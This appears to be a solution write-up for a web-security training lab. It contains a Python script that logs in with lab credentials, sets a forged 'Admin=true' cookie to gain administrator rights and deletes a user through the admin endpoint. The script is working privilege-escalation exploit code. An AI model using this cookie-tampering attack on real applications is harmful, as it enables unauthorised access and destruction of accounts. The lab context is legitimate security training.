# User role controlled by request parameter
> This lab has an admin panel at `/admin`, which identifies administrators using a forgeable cookie.
> Solve the lab by accessing the admin panel and using it to delete the user `carlos`.
> You can log in to your own account using the following credentials: `wiener:peter`

```python
import requests
import sys
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "https://0add004d03be161987dd6a3300110008.web-security-academy.net/"

def exploit_privilege_escalation(url):
    session = requests.Session()
    
    # 1. Login to establish a session
    login_url = f"{url}login"
    print(f"[*] Navigating to login: {login_url}")
    
    # Get CSRF token
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    creds = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    
    print("[*] Logging in as 'wiener'...")
    login_resp = session.post(login_url, data=creds)
    
    if "Log out" in login_resp.text:
        print("[+] Login Successful.")
        
        # 2. Exploit: Tamper with the cookie
        # The server likely set Admin=false. We override it to true.
        print("[*] Escalate Privileges: Setting Cookie Admin=true")
        session.cookies.set("Admin", "true")
        
        # 3. Access Admin Panel & Delete User
        # Navigate directly to the delete endpoint as we are now "Admin"
        delete_url = f"{url}admin/delete?username=carlos"
        print(f"[*] Triggering deletion: {delete_url}")
        
        del_resp = session.get(delete_url)
        
        if del_resp.status_code == 200:
            print("[+] SUCCESS: User 'carlos' deleted.")
        elif del_resp.status_code == 401:
            print("[-] Failed: Unauthorized. Cookie tampering did not work.")
        else:
            print(f"[-] Failed with status: {del_resp.status_code}")
            
    else:
        print("[-] Login failed.")

if __name__ == "__main__":
    exploit_privilege_escalation(BASE_URL)
```
